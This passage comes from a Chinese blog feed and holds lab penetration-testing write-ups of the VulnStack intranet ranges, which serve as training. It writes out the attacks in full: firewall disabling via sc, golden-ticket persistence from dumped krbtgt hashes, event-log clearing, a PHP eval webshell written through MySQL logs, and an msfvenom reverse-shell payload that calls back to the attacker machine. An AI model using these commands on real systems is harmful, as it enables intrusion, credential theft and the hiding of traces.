class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -sS -sV -sC -A -p- --min-rate 5000 192.168.138.138</span><br><span class="line">Nmap scan report for 192.168.138.138</span><br><span class="line">Host is up (0.0024s latency).</span><br><span class="line">Not shown: 65516 filtered ports</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">25/tcp    open  tcpwrapped</span><br><span class="line">|_smtp-commands: Couldn&#x27;t establish connection on port 25</span><br><span class="line">53/tcp    open  domain       Microsoft DNS 6.1.7600 (1DB04001) (Windows Server 2008 R2)</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: Microsoft DNS 6.1.7600 (1DB04001)</span><br><span class="line">110/tcp   open  tcpwrapped</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: sun.com, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds Windows Server 2008 HPC Edition 7600 microsoft-ds (workgroup: SUN)</span><br><span class="line">3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: sun.com, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">49152/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49158/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49160/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49168/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49173/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49226/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Microsoft Windows XP|7|2012</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2012</span><br><span class="line">OS details: Microsoft Windows XP SP3, Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2, cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -2h39m55s, deviation: 4h36m58s, median: -1s</span><br><span class="line">|_nbstat: NetBIOS name: DC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:92:68:89 (VMware)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows Server 2008 HPC Edition 7600 (Windows Server 2008 HPC Edition 6.1)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_server_2008::-</span><br><span class="line">|   Computer name: DC</span><br><span class="line">|   NetBIOS computer name: DC\x00</span><br><span class="line">|   Domain name: sun.com</span><br><span class="line">|   Forest name: sun.com</span><br><span class="line">|   FQDN: DC.sun.com</span><br><span class="line">|_  System time: 2022-11-08T01:37:00+08:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: required</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2022-11-07T17:37:00</span><br><span class="line">|_  start_date: 2022-11-07T16:39:34</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 25/tcp)</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   3.57 ms 192.168.135.2</span><br><span class="line">2   3.58 ms 192.168.138.138</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 277.66 seconds</span><br></pre></td></tr></table></figure><p>开启了445端口，尝试利用ms17_010未果，但因为已经拿到了域管的账号和密码，所以尝试利用psexec进行无IPC登陆域控。</p><h2 id="psexec登陆域控"><a href="#psexec登陆域控" class="headerlink" title="psexec登陆域控"></a>psexec登陆域控</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set rhosts 192.168.138.138</span><br><span class="line">set SMBDomain SUN</span><br><span class="line">set SMBUser Administrator</span><br><span class="line">set SMBPass dc123.com</span><br><span class="line">set payload windows/meterpreter/bind_tcp #因为已经配置好了路由，且域控不出网</span><br><span class="line">set lport 1239</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/65752579c458853aef439129.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65752579c458853aef439129.jpg"></a></p><p>没有登陆成功，猜测是开启了防火墙，尝试关闭防火墙：</p><p>首先开启Win7与Windows2008之间的IPC连接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.138.138\ipc$ &quot;dc123.com&quot; /user:&quot;Administrator&quot;</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/6575258bc458853aef43ce05.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6575258bc458853aef43ce05.jpg"></a></p><p>接着用sc通过创建服务来远程执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.168.138.138 create unablefirewall binpath= &quot;netsh advfirewall set allprofiles state off&quot;</span><br><span class="line">sc \\192.168.138.138 start unablefirewall</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/65752597c458853aef43f331.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65752597c458853aef43f331.jpg"></a></p><p>此时再次启动利用psexec登陆域控：</p><p><a href="https://pic.imgdb.cn/item/657525a3c458853aef441bad.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/657525a3c458853aef441bad.jpg"></a></p><p>成功登陆。刚刚利用nmap扫域控的时候没有发现开启3389端口，进去输入netstat -ano看看情况：</p><p><a href="https://pic.imgdb.cn/item/657525afc458853aef4440e9.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/657525afc458853aef4440e9.jpg"></a></p><p>并未发现3389端口开启。先看看有没有开启RDP：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections</span><br><span class="line"># 查看RDP服务是否开启：1关闭，0开启  </span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/657525bfc458853aef44708e.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/657525bfc458853aef44708e.jpg"></a></p><p>可以发现RDP是关闭的。那么我们给它打开：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/657525cec458853aef44a508.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/657525cec458853aef44a508.jpg"></a></p><p>因为我们刚刚已经关闭了防火墙，所以在此处我们不需要添加防火墙规则允许3389端口了。再查看一下端口情况：</p><p><a href="https://pic.imgdb.cn/item/657525ddc458853aef44dc66.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/657525ddc458853aef44dc66.jpg"></a></p><p>接下来再利用隧道登陆到域控的远程桌面上：</p><p><a href="https://pic.imgdb.cn/item/657525e7c458853aef45021f.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/657525e7c458853aef45021f.jpg"></a></p><p>成功登陆：</p><p><a href="https://pic.imgdb.cn/item/657525f4c458853aef453046.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/657525f4c458853aef453046.jpg"></a></p><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>首先拿到krbtgt的ntlm hash值和域SID值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # lsadump::lsa /patch</span><br><span class="line">Domain : SUN / S-1-5-21-3388020223-1982701712-4030140183</span><br><span class="line"></span><br><span class="line">RID  : 000001f4 (500)</span><br><span class="line">User : Administrator</span><br><span class="line">LM   : </span><br><span class="line">NTLM : 8c535a2d84c3b21059d667639bb89db5</span><br><span class="line"></span><br><span class="line">RID  : 000001f5 (501)</span><br><span class="line">User : Guest</span><br><span class="line">LM   : </span><br><span class="line">NTLM : </span><br><span class="line"></span><br><span class="line">RID  : 000001f6 (502)</span><br><span class="line">User : krbtgt</span><br><span class="line">LM   : </span><br><span class="line">NTLM : 65dc23a67f31503698981f2665f9d858</span><br><span class="line"></span><br><span class="line">RID  : 000003e8 (1000)</span><br><span class="line">User : admin</span><br><span class="line">LM   : </span><br><span class="line">NTLM : 8c535a2d84c3b21059d667639bb89db5</span><br><span class="line"></span><br><span class="line">RID  : 00000456 (1110)</span><br><span class="line">User : leo</span><br><span class="line">LM   : </span><br><span class="line">NTLM : afffeba176210fad4628f0524bfe1942</span><br><span class="line"></span><br><span class="line">RID  : 000003e9 (1001)</span><br><span class="line">User : DC$</span><br><span class="line">LM   : </span><br><span class="line">NTLM : 7178f86541258a83bf19728f010c64da</span><br><span class="line"></span><br><span class="line">RID  : 00000451 (1105)</span><br><span class="line">User : WIN7$</span><br><span class="line">LM   : </span><br><span class="line">NTLM : dc1cbe1583c92a3740cfcd97e8f0a377</span><br></pre></td></tr></table></figure><p>再Win7上先清除票据缓存：</p><p><a href="https://pic.imgdb.cn/item/65752602c458853aef456137.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65752602c458853aef456137.jpg"></a></p><p>生成黄金票据并注入内存：</p><p><a href="https://pic.imgdb.cn/item/6575260ec458853aef458562.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6575260ec458853aef458562.jpg"></a></p><p>执行klist查看票据：</p><p><a href="https://pic.imgdb.cn/item/65752619c458853aef45a800.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65752619c458853aef45a800.jpg"></a></p><p><a href="https://pic.imgdb.cn/item/65752623c458853aef45c7ce.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65752623c458853aef45c7ce.jpg"></a></p><h2 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h2><p>查看事件日志:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run event_manager -i</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/6575262ec458853aef45e6f4.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6575262ec458853aef45e6f4.jpg"></a></p><p>清除事件日志（包括六种日志类型）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run event_manager -c</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/6575263bc458853aef4612a7.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6575263bc458853aef4612a7.jpg"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透——VulnStack-1</title>
      <link href="/2022/07/01/vulnstack1/"/>
      <url>/2022/07/01/vulnstack1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近打了一下红日安全的VulnStack，一个内网渗透靶场，挺好玩的，而且对新手也比较友好，感觉自己对Metasploit和CobaltStike的操作也更熟悉了，在这里记录一下。靶场下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>kali攻击机：192.168.229.133</p><p>Windows 7 x64：192.168.52.143、192.168.229.138</p><p>Windows Server 2008：192.168.52.138</p><p>Windows2003：192.168.52.141</p><p>环境配置好后，在Windows7中利用phpstudy开启Web服务，接下来就直接开搞。</p><h2 id="外网突破"><a href="#外网突破" class="headerlink" title="外网突破"></a>外网突破</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>nmap扫一波：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sC -A -Pn -p- --min-rate 5000 192.168.229.138                                                                        </span><br><span class="line">Host discovery disabled (-Pn). All addresses will be marked &#x27;up&#x27; and scan times will be slower.</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-01 04:45 EDT</span><br><span class="line">Nmap scan report for 192.168.229.138</span><br><span class="line">Host is up (0.00035s latency).</span><br><span class="line">Not shown: 65523 closed ports</span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">80/tcp   open  http         Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.4.45)</span><br><span class="line">|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45</span><br><span class="line">|_http-title: phpStudy \xE6\x8E\xA2\xE9\x92\x88 2014 </span><br><span class="line">135/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: GOD)</span><br><span class="line">1025/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">1026/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">1027/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">1028/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">1029/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">1030/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">3306/tcp open  mysql        MySQL (unauthorized)</span><br><span class="line">3389/tcp open  tcpwrapped</span><br><span class="line">| ssl-cert: Subject: commonName=stu1.god.org</span><br><span class="line">| Not valid before: 2022-06-29T05:13:38</span><br><span class="line">|_Not valid after:  2022-12-29T05:13:38</span><br><span class="line">|_ssl-date: 2022-07-01T08:46:49+00:00; -2s from scanner time.</span><br><span class="line">MAC Address: 00:0C:29:58:D7:1A (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Microsoft Windows 7|2008|8.1</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1</span><br><span class="line">OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Host: STU1; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -2h00m01s, deviation: 3h59m59s, median: -2s</span><br><span class="line">|_nbstat: NetBIOS name: STU1, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:58:d7:1a (VMware)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional</span><br><span class="line">|   Computer name: stu1</span><br><span class="line">|   NetBIOS computer name: STU1\x00</span><br><span class="line">|   Domain name: god.org</span><br><span class="line">|   Forest name: god.org</span><br><span class="line">|   FQDN: stu1.god.org</span><br><span class="line">|_  System time: 2022-07-01T16:46:35+08:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: &lt;blank&gt;</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2022-07-01T08:46:35</span><br><span class="line">|_  start_date: 2022-07-01T08:35:44</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.35 ms 192.168.229.138</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 90.94 seconds</span><br></pre></td></tr></table></figure><p>可以看到开放了80、3306、3389、445这些端口。接下来我们去80端口看看，发现一个phpstudy探针的界面：</p><p><a href="/images/62bf494c1d64b07066dbc54f.png" title="image-20220701165347277" class="gallery-item"><img src="/images/62bf494c1d64b07066dbc54f.png" alt="image-20220701165347277"></a></p><p>这是版本老一点的phpstudy会出现的界面，我们在该界面中可以利用弱口令root&#x2F;root成功连接MySQL：</p><p><a href="/images/62bf49821d64b07066dbe9a9.png" title="image-20220701165634053" class="gallery-item"><img src="/images/62bf49821d64b07066dbe9a9.png" alt="image-20220701165634053"></a></p><p>dirsearch扫描后，还有这些目录：</p><p><a href="/images/62bf498e1d64b07066dbf18a.png" title="image-20220701165726039" class="gallery-item"><img src="/images/62bf498e1d64b07066dbf18a.png" alt="image-20220701165726039"></a></p><h3 id="MySQL写入webshell"><a href="#MySQL写入webshell" class="headerlink" title="MySQL写入webshell"></a>MySQL写入webshell</h3><p>phpstudy默认是安装了phpmyadmin的，那我们就可以利用刚刚得到的账号密码来登陆phpmyadmin了。登陆之后，当然就是要看看能不能写个webshell了，首先看看写文件的配置开了没：</p><p><a href="/images/62bf49a11d64b07066dbfe87.png" title="image-20220701170000896" class="gallery-item"><img src="/images/62bf49a11d64b07066dbfe87.png" alt="image-20220701170000896"></a></p><p>没打开，那我们就利用日志写webshell吧，看看日志的全局变量：</p><p><a href="/images/62bf49af1d64b07066dc07be.png" title="image-20220701170124949" class="gallery-item"><img src="/images/62bf49af1d64b07066dc07be.png" alt="image-20220701170124949"></a></p><p>那我们利用如下SQL语句给改一下吧：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> &quot;ON&quot;;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;C:\\phpStudy\\WWW\\shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure><p><a href="/images/62bf49ba1d64b07066dc0fdf.png" title="image-20220701170417177" class="gallery-item"><img src="/images/62bf49ba1d64b07066dc0fdf.png" alt="image-20220701170417177"></a></p><p>接下来再随便写个select语句把webshell写进日志里：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> &quot;&lt;?php eval($_POST[&#x27;shell&#x27;]);?&gt;&quot;</span><br></pre></td></tr></table></figure><p>这样就成功写入webshell了：</p><p><a href="/images/62bf49c61d64b07066dc1787.png" title="image-20220701170614588" class="gallery-item"><img src="/images/62bf49c61d64b07066dc1787.png" alt="image-20220701170614588"></a></p><p>蚁剑连接，成功突破外网！</p><h2 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h2><h3 id="内网初探"><a href="#内网初探" class="headerlink" title="内网初探"></a>内网初探</h3><p>首先构造个windows的马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.229.133 LPORT=1234 -f exe -o ma.exe</span><br></pre></td></tr></table></figure><p>然后利用蚁剑给传上去，接着在msf的exploit&#x2F;multi&#x2F;handler的模块中做好相应配置：</p><p><a href="/images/62bf49d71d64b07066dc23d8.png" title="image-20220701172030141" class="gallery-item"><img src="/images/62bf49d71d64b07066dc23d8.png" alt="image-20220701172030141"></a></p><p>在蚁剑终端中允许木马，进入meterpreter。把mimikatz.exe利用蚁剑也上传一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">upload ./Desktop/mimikatz C:\\</span><br><span class="line">shell</span><br><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug#权限提升</span><br><span class="line">sekurlsa::logonPasswords#明文抓取</span><br></pre></td></tr></table></figure><p>尝试拿一下系统密码：</p><p><a href="/images/62bf4a231d64b07066dc5439.jpg" title="image-20220701174721144" class="gallery-item"><img src="/images/62bf4a231d64b07066dc5439.jpg" alt="image-20220701174721144"></a></p><p>拿到明文密码：</p><p><a href="/images/62bf4a3c1d64b07066dc658d.jpg" title="image-20220701174839187" class="gallery-item"><img src="/images/62bf4a3c1d64b07066dc658d.jpg" alt="image-20220701174839187"></a></p><p>拿到密码，接下来尝试打开靶机的远程桌面。首先我们利用nmap扫一下3389端口，但是结果为filtered，3389端口存在防火墙过滤。我们可以利用msf的post&#x2F;windows&#x2F;manage&#x2F;enable_rdp模块去尝试防火墙：</p><p><a href="/images/62bf4a5b1d64b07066dc7b04.jpg" title="image-20220701182103081" class="gallery-item"><img src="/images/62bf4a5b1d64b07066dc7b04.jpg" alt="image-20220701182103081"></a></p><p>再用nmap扫一下，成功关闭防火墙：</p><p><a href="/images/62bf4a651d64b07066dc8468.jpg" title="image-20220701182134202" class="gallery-item"><img src="/images/62bf4a651d64b07066dc8468.jpg" alt="image-20220701182134202"></a></p><p>那我们接下来就尝试打开靶机的远程桌面，利用post&#x2F;windows&#x2F;manage&#x2F;enable_rdp中的rdesktop命令进行远程登陆：</p><p><a href="/images/62bf4a771d64b07066dc9179.jpg" title="image-20220701182419901" class="gallery-item"><img src="/images/62bf4a771d64b07066dc9179.jpg" alt="image-20220701182419901"></a></p><p>至此，对这台win7的渗透基本完成，接下来继续进行内网横向移动，可以利用如下命令拿到一些内网信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">net view                 # 查看局域网内其他主机名</span><br><span class="line">net config Workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span><br><span class="line">net user                 # 查看本机用户列表</span><br><span class="line">net user /domain         # 查看域用户</span><br><span class="line">net localgroup administrators # 查看本地管理员组（通常会有域用户）</span><br><span class="line">net view /domain         # 查看有几个域</span><br><span class="line">net user 用户名 /domain   # 获取指定域用户的信息</span><br><span class="line">net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</span><br><span class="line">net time /domain    #判断主域，主域服务器一般做时间服务器</span><br><span class="line">net group 组名 /domain    # 查看域中某工作组</span><br><span class="line">net group &quot;domain admins&quot; /domain  # 查看域管理员的名字</span><br><span class="line">net group &quot;domain computers&quot; /domain  # 查看域中的其他主机名</span><br><span class="line">net group &quot;domain controllers&quot; /domain  # 查看域控制器主机名（可能有多台）</span><br><span class="line">ipconfig /all #查询本机IP段，所在域等</span><br></pre></td></tr></table></figure><p><code>net view</code>：</p><p><a href="/images/62bf4a891d64b07066dc9fc2.jpg" title="image-20220701172233614" class="gallery-item"><img src="/images/62bf4a891d64b07066dc9fc2.jpg" alt="image-20220701172233614"></a></p><p><code>net config Workstation</code>：</p><p><a href="/images/62bf4a951d64b07066dca9e1.jpg" title="image-20220701172322585" class="gallery-item"><img src="/images/62bf4a951d64b07066dca9e1.jpg" alt="image-20220701172322585"></a></p><p>可以看到登陆域为GOD，计算机名为STU1。</p><p><code>net user</code>：</p><p><a href="/images/62bf4aa61d64b07066dcb6f5.jpg" title="image-20220701172424042" class="gallery-item"><img src="/images/62bf4aa61d64b07066dcb6f5.jpg" alt="image-20220701172424042"></a></p><p><code>net user /domain</code>：</p><p><a href="/images/62bf4ab51d64b07066dcc315.jpg" title="image-20220701172506188" class="gallery-item"><img src="/images/62bf4ab51d64b07066dcc315.jpg" alt="image-20220701172506188"></a></p><p><code>net localgroup administrators</code>：</p><p><a href="/images/62bf4ac01d64b07066dccad9.jpg" title="image-20220701172731217" class="gallery-item"><img src="/images/62bf4ac01d64b07066dccad9.jpg" alt="image-20220701172731217"></a></p><p><code>net view /domain</code>：</p><p><a href="/images/62bf4acc1d64b07066dcd4a8.jpg" title="image-20220701172803499" class="gallery-item"><img src="/images/62bf4acc1d64b07066dcd4a8.jpg" alt="image-20220701172803499"></a></p><p>只有一个GOD域。</p><p><code>net user Administrator /domain</code>：</p><p><a href="/images/62bf4ad61d64b07066dcdc79.jpg" title="image-20220701172953199" class="gallery-item"><img src="/images/62bf4ad61d64b07066dcdc79.jpg" alt="image-20220701172953199"></a></p><p><code>net group &quot;domain admins&quot; /domain</code>：</p><p><a href="/images/62bf4ae71d64b07066dce805.jpg" title="image-20220701173128166" class="gallery-item"><img src="/images/62bf4ae71d64b07066dce805.jpg" alt="image-20220701173128166"></a></p><p>可以看到Administrator为域管。</p><p><code>net group &quot;domain controllers &quot; /domain</code>：</p><p><a 